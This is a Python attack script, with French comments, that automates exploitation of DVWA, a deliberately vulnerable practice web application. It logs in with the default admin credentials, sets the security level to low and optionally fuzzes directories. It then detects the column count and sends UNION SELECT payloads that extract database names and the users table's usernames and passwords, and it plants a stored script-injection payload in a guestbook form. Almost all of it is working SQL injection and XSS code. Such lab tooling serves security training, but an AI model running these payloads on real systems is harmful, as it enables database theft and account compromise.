from vuln.fuzz import fuzz_web_application
import sys
import argparse
import requests
import re
import bs4
import os

def extract_content(html_text):
    """Extrait le contenu entre les balises <pre>"""
    pre_pattern = re.compile(r'<pre>(.*?)</pre>', re.DOTALL)
    matches = pre_pattern.findall(html_text)
    if matches:
        return '\n'.join(matches)
    return None

def check_sqli_success(response_text, payload):
    """Vérifie si l'injection SQL semble avoir réussi"""
    if "Error:" in response_text and "SQL syntax" in response_text:
        print("[+] Injection détectée: Erreur SQL visible!")
    elif "ID:" in response_text and "First name:" in response_text:
        print("[+] Résultats de requête visibles!")
    elif "UNION SELECT" in payload and "UNION SELECT" not in response_text:
        if len(re.findall(r'<td>\d+</td>', response_text)) > 0:
            print("[+] UNION injection semble avoir fonctionné!")
    elif "database()" in payload and re.search(r'<td>[a-zA-Z0-9_]+</td>', response_text):
        print("[+] Extraction d'information de la base de données réussie!")
    elif "users" in payload and "admin" in response_text.lower():
        print("[+] Extraction des données utilisateurs réussie!")

def login_dvwa(target_url):
    """
    Se connecte à DVWA et retourne la session authentifiée
    """
    login_url = f"http://{target_url}/DVWA/login.php"
    
    headers = {
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": f"http://{target_url}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": login_url,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    
    session = requests.Session()
    
    domain = target_url.split('/')[0] if '/' in target_url else target_url
    
    session.cookies.set('PHPSESSID', '7h65ppp67ai229o3el8do6kjh2', domain=domain)
    session.cookies.set('security', 'low', domain=domain)
    
    print("[*] Récupération du token CSRF...")
    response = session.get(login_url, headers=headers)
    
    print(f"[*] Cookies après accès à la page de login:")
    for cookie in session.cookies:
        print(f"  {cookie.name}: {cookie.value} (domaine: {cookie.domain}, chemin: {cookie.path})")
    
    token_match = re.search(r'user_token\'\s*value=\'([a-f0-9]+)\'', response.text)
    if not token_match:
        print("[-] Impossible de récupérer le token CSRF. Vérifiez la connexion ou l'URL.")
        return None
    
    user_token = token_match.group(1)
    print(f"[+] Token CSRF récupéré: {user_token}")
    
    security_cookie_found = False
    security_value = None
    for cookie in session.cookies:
        if cookie.name == 'security':
            security_cookie_found = True
            security_value = cookie.value
            break
    
    if not security_cookie_found or security_value != 'low':
        cookies_to_remove = []
        for cookie in session.cookies:
            if cookie.name == 'security':
                cookies_to_remove.append(cookie)
        
        for cookie in cookies_to_remove:
            session.cookies.clear(cookie.domain, cookie.path, cookie.name)
        
        print("[*] Réapplication du cookie security=low")
        session.cookies.set('security', 'low', domain=domain)
    
    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }
    
    print("[*] Tentative de connexion...")
    login_response = session.post(login_url, data=data, headers=headers, allow_redirects=True)
    
    print(f"[*] Cookies après tentative de connexion:")
    for cookie in session.cookies:
        print(f"  {cookie.name}: {cookie.value} (domaine: {cookie.domain}, chemin: {cookie.path})")
    
    if "Welcome to Damn Vulnerable Web Application!" in login_response.text:
        print("[+] Connexion réussie!")
        
        security_cookie_found = False
        security_value = None
        for cookie in session.cookies:
            if cookie.name == 'security':
                security_cookie_found = True
                security_value = cookie.value
                break
        
        if not security_cookie_found or security_value != 'low':
            cookies_to_remove = []
            for cookie in session.cookies:
                if cookie.name == 'security':
                    cookies_to_remove.append(cookie)
            
            for cookie in cookies_to_remove:
                session.cookies.clear(cookie.domain, cookie.path, cookie.name)
            
            # Définir un nouveau cookie security=low
            print("[*] Définition explicite de security=low après connexion")
            session.cookies.set('security', 'low', domain=domain)
            
        print("[*] Session authentifiée établie avec security=low")
        print("[*] Cookies finaux de session:")
        for cookie in session.cookies:
            print(f"  {cookie.name}: {cookie.value} (domaine: {cookie.domain}, chemin: {cookie.path})")
            
        return session
    elif "login failed" in login_response.text.lower():
        print("[-] Échec de la connexion. Identifiants incorrects.")
    else:
        print("[?] Statut de connexion incertain. Code de statut:", login_response.status_code)
    
    return None

def detect_columns(url, session):
    for i in range(1, 11):
        payload = f"6' ORDER BY {i} -- -"
        try:
            response = session.get(f"{url}?id={payload}&Submit=Submit")
            
            error_keywords = [
                "Unknown column",
                "Uncaught",
                "SQL syntax",
                "mysql_error",
                "column not found",
                "order by",
                "mysqli_sql_exception"
            ]
            
            if any(keyword.lower() in response.text.lower() for keyword in error_keywords):
                print(f"Erreur trouvée à la colonne {i}")
                print(f"Nombre de colonnes: {i-1}")
                return i-1
            print(f"Test colonne {i}...")
            
        except Exception as e:
            print(f"Erreur: {e}")
            return i-1
    
    return 10  # Si aucune erreur trouvée, on suppose 10 colonnes max

def sqli(target_url, session, payloads=None):
    """
    Exécute une injection SQL sur l'URL cible en utilisant une session authentifiée
    et des payloads personnalisés
    """
    print(f"[*] Exécution des tests d'injection SQL sur: {target_url}")
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = f"http://{target_url}"
    
    if "vulnerabilities/sqli" in target_url:
        base_url = target_url
    else:
        # Construire l'URL de la page SQLi de DVWA
        base_url = f"{target_url}/DVWA/vulnerabilities/sqli/"
        if not base_url.startswith(('http://', 'https://')):
            base_url = f"http://{base_url}"
    
    print(f"[*] URL de base utilisée: {base_url}")
    
    # Extraire le domaine pour les cookies
    domain = None
    if '://' in target_url:
        domain = target_url.split('://', 1)[1].split('/', 1)[0]
    
    # Nettoyer tout cookie security existant pour éviter les conflits
    print("[*] Nettoyage des cookies de sécurité existants...")
    cookies_to_remove = []
    for cookie in session.cookies:
        if cookie.name == 'security':
            cookies_to_remove.append(cookie)
    
    for cookie in cookies_to_remove:
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)
    
    print(f"[*] Définition du cookie security=low pour le domaine: {domain}")
    session.cookies.set('security', 'low', domain=domain)
    
    if payloads is None:
        payloads = [
            "1",                      # Requête valide
            "6",                      # Test avec ID=6
            "'",                      # Test simple d'erreur SQL
            "1' OR '1'='1 -- -",      # Bypass d'authentification basique
        ]
    
    # Récupérer d'abord un token CSRF général
    try:
        response = session.get(base_url)
        csrf_token = None
        token_match = re.search(r'user_token[\'"]?\s*value=[\'"]?([a-f0-9]+)[\'"]?', response.text)
        if token_match:
            csrf_token = token_match.group(1)
            print(f"[+] Token CSRF initial récupéré: {csrf_token}")
        else:
            print("[-] Impossible de récupérer le token CSRF initial")
    except requests.RequestException as e:
        print(f"[-] Erreur lors de la récupération de la page: {e}")
        return "Erreur de connexion initiale"
    
    # Exécuter chaque payload
    results = []
    print("[*] Exécution des injections SQL...")
    
    for payload in payloads:
        print(f"\n[*] Test avec payload: {payload}")
        
        try:
            print("[*] Récupération d'un nouveau token CSRF...")
            token_response = session.get(base_url)
            
            # Vérifier et mettre à jour le cookie security si nécessaire
            security_cookie_found = False
            for cookie in session.cookies:
                if cookie.name == 'security':
                    security_cookie_found = True
                    if cookie.value != 'low':
                        session.cookies.clear(cookie.domain, cookie.path, cookie.name)
                        session.cookies.set('security', 'low', domain=domain)
                        print("[*] Cookie security réinitialisé à 'low'")
                    break
            
            if not security_cookie_found:
                session.cookies.set('security', 'low', domain=domain)
                print("[*] Cookie security ajouté car manquant")
            
            # Extraire le token CSRF ou utiliser celui récupéré précédemment
            token_match = re.search(r'user_token[\'"]?\s*value=[\'"]?([a-f0-9]+)[\'"]?', token_response.text)
            if token_match:
                user_token = token_match.group(1)
                print(f"[+] Nouveau token CSRF récupéré: {user_token}")
            else:
                user_token = csrf_token  # Utiliser le token initial comme fallback
                print(f"[-] Utilisation du token CSRF initial: {user_token}")
            
        except requests.RequestException as e:
            print(f"[-] Erreur lors de la récupération du token: {e}")
            user_token = csrf_token  # Utiliser le token initial comme fallback
        
        # Construction des paramètres
        params = {"id": payload, "Submit": "Submit"}
        if user_token:
            params["user_token"] = user_token
        
        try:
            # Exécuter la requête
            print(f"[*] Envoi de la requête avec les paramètres: {params}")
            response = session.get(base_url, params=params)
            
            # Analyser la réponse
            print(f"[+] Code de statut: {response.status_code}")
            print(f"[+] URL complète utilisée: {response.url}")
            
            # Extraire et afficher le contenu
            content = extract_content(response.text)
            if content:
                print("[+] Résultat:")
                print(content)
                # Stocker les résultats importants
                results.append({"payload": payload, "content": content})
            else:
                print("[-] Pas de contenu <pre> extractible")
                
                # Analyse supplémentaire pour détecter des situations spécifiques
                if "login" in response.text.lower() or "not logged in" in response.text.lower():
                    print("[-] Possible problème d'authentification - la session semble expirée")
                elif "token" in response.text.lower() and "invalid" in response.text.lower():
                    print("[-] Possible problème de token CSRF")
                elif any(error in response.text for error in ["mysqli_sql_exception", "SQL syntax", "mysql_error"]):
                    print("[+] Injection détectée: Erreur SQL visible!")
                    # Essayer d'extraire l'erreur spécifique
                    error_match = re.search(r'(Error:.*?|Warning:.*?|exception.*?)(?:<br|<\/div|<\/p)', response.text, re.DOTALL | re.IGNORECASE)
                    if error_match:
                        error_text = error_match.group(1).strip()
                        print(f"[+] Message d'erreur: {error_text}")
            
            # Vérifier si l'injection a réussi
            check_sqli_success(response.text, payload)
            
        except requests.RequestException as e:
            print(f"[-] Erreur lors de la requête: {e}")
    
    return results

# -------------------------------------------------------------------
# Tests SQLi automatisés (retourne un dict de résultats)
# -------------------------------------------------------------------

def sqli_testing(target_url, session, path_to_test):
    # Construction de l'URL
    if not path_to_test.startswith(('http://', 'https://')):
        if path_to_test.startswith('/'):
            path_to_test = path_to_test[1:]
        full_url = f"http://{target_url}/{path_to_test.lstrip('/')}"
    else:
        full_url = path_to_test
    
    print(f"URL: {full_url}")
    
    # Détection du nombre de colonnes
    print("\nDétection des colonnes...")
    num_columns = detect_columns(full_url, session)
    
    if num_columns > 0:
        print(f"\n{num_columns} colonnes détectées")
        
        # Construction des payloads
        payloads = []
        
        # Test basique
        cols = ["1"] * num_columns
        payloads.append(f"6' UNION SELECT {','.join(cols)} -- -")
        
        # Test avec database()
        cols = ["database()"] + ["NULL"] * (num_columns - 1)
        payloads.append(f"6' UNION SELECT {','.join(cols)} -- -")
        
        # Test users/passwords si 2+ colonnes
        if num_columns >= 2:
            cols = ["user", "password"] + ["NULL"] * (num_columns - 2)
            payloads.append(f"6' UNION SELECT {','.join(cols)} FROM users -- -")
        
        print("\nPayloads qui seront testés:")
        for p in payloads:
            print(f"- {p}")
        
        # Demande de confirmation
        confirm = input("\nLancer l'exploitation? (y/n): ").lower().strip()
        if confirm != 'y':
            print("Exploitation annulée")
            return {
                "url": full_url,
                "num_columns": 0,
                "payloads_tested": 0,
                "successes": 0,
                "details": [],
            }
        
        print("\nExécution des tests...")
        results = sqli(full_url, session, payloads)
        
        print("\nRésultats:")
        print(f"- URL: {full_url}")
        print(f"- Colonnes: {num_columns}")
        print(f"- Tests réussis: {len(results) if results else 0}")
        
        # Renvoyer un résumé structuré
        return {
            "url": full_url,
            "num_columns": num_columns,
            "payloads_tested": len(payloads),
            "successes": len(results) if 'results' in locals() else 0,
            "details": results if 'results' in locals() else [],
        }
    else:
        print("Impossible de détecter le nombre de colonnes")
        num_columns = 0

    # Renvoyer un résumé structuré
    return {
        "url": full_url,
        "num_columns": num_columns,
        "payloads_tested": 0,
        "successes": 0,
        "details": [],
    }

def test_simple_xss(target_url, session=None):
    """Effectue un test XSS simple (stored) sur DVWA."""
    if session is None:
        print("[*] Connexion à DVWA…")
        session = login_dvwa(target_url)
        if not session:
            print("[-] Connexion échouée")
            return False
     
    base_url = f"http://{target_url}/DVWA/vulnerabilities/xss_s/"
    
    # Payloads à tester
    simple_payload = "TESTXSS123"
    xss_payload = "<script>alert('XSS')</script>"
    success_payloads = []  # Contiendra uniquement les payloads reflétant un XSS réel
    
    print(f"[*] Test avec payload simple: {simple_payload}")
    
    # Récupérer la page et le token
    response = session.get(base_url)
    token_match = re.search(r'user_token.*?value=[\'"]([a-f0-9]+)[\'"]', response.text)
    csrf_token = token_match.group(1) if token_match else None
    
    print(f"[*] Token CSRF trouvé: {csrf_token}")
    
    # Envoyer le payload simple
    data = {
        "txtName": simple_payload,
        "mtxMessage": f"Message avec {simple_payload}",
        "btnSign": "Sign Guestbook"
    }
    
    if csrf_token:
        data["user_token"] = csrf_token
    
    print("[*] Envoi du payload...")
    post_response = session.post(base_url, data=data)
    
    print(f"[*] Status: {post_response.status_code}")
    
    # Vérifier si le payload apparaît
    check_response = session.get(base_url)
    
    if simple_payload in check_response.text:
        print(f"[+] Formulaire accessible, test de XSS réel…")
        print(f"[*] Test XSS: {xss_payload}")
        
        xss_data = {
            "txtName": xss_payload,
            "mtxMessage": f"XSS test: {xss_payload}",
            "btnSign": "Sign Guestbook"
        }
        
        if csrf_token:
            # Récupérer un nouveau token
            new_response = session.get(base_url)
            new_token_match = re.search(r'user_token.*?value=[\'"]([a-f0-9]+)[\'"]', new_response.text)
            new_csrf_token = new_token_match.group(1) if new_token_match else csrf_token
            xss_data["user_token"] = new_csrf_token
        
        session.post(base_url, data=xss_data)
        
        # Vérifier le résultat
        final_response = session.get(base_url)
        
        if "<script>" in final_response.text:
            print("[+] XSS réussi! Script non échappé!")
            success_payloads.append(xss_payload)
            return {"success": True, "payloads": success_payloads}
        elif "&lt;script&gt;" in final_response.text or xss_payload not in final_response.text:
            print("[-] XSS bloqué")
        else:
            print("[?] Statut XSS incertain")
            
    else:
        print("[-] Payload simple non trouvé. Problème de base avec le formulaire.")
        print("[*] Extrait de la réponse:")
        print(check_response.text[:500])
    return {"success": False, "payloads": success_payloads}

# -------------------------------------------------------------------
# Fonction utilitaire pour enchaîner SQLi + XSS sans interaction
# -------------------------------------------------------------------

def run_default_dvwa_tests(target_url):
    """Effectue automatiquement SQLi + XSS et renvoie un résumé."""
    print("[+] Lancement des tests DVWA par défaut (SQLi + XSS)…")
    session = login_dvwa(target_url)
    if not session:
        print("[-] Impossible de se connecter à DVWA, tests annulés")
        return {
            "target": target_url,
            "sqli": None,
            "xss_success": False,
        }

    sqli_info = sqli_testing(target_url, session, "DVWA/vulnerabilities/sqli/")
    xss_info = test_simple_xss(target_url, session)

    return {
        "target": target_url,
        "sqli": sqli_info,
        "xss": xss_info,
    }

if __name__ == '__main__':
    ospath = os.path.join(os.path.dirname(__file__), "directory-list-2.3-small.txt")

    parser = argparse.ArgumentParser(description="Web application fuzzer + DVWA tests")
    parser.add_argument("target_url", help="The target URL (without http://)")
    parser.add_argument("-w", "--wordlist", default=ospath, help="Path to wordlist file")
    parser.add_argument("-d", "--depth", type=int, default=3, help="Maximum recursion depth for fuzzing (default: 3)")
    parser.add_argument("-s", "--status-codes", default="200", help="Comma-separated HTTP codes to display (default: 200)")
    parser.add_argument("--no-fuzz", action="store_true", help="Skip directory fuzzing and run only DVWA tests")
    
    args = parser.parse_args()

    file_path = args.wordlist
    target_url = args.target_url
    allowed_status_codes = args.status_codes.split(",")
    max_depth = args.depth

    if not args.no_fuzz:
        print(f"Starting recursive scan of {target_url} with max depth {max_depth}")
        fuzz_web_application(file_path, target_url, allowed_status_codes, max_depth)
        print("Fuzzing completed.\n")

    summary = run_default_dvwa_tests(target_url)
    print("Résumé des tests DVWA:", summary)
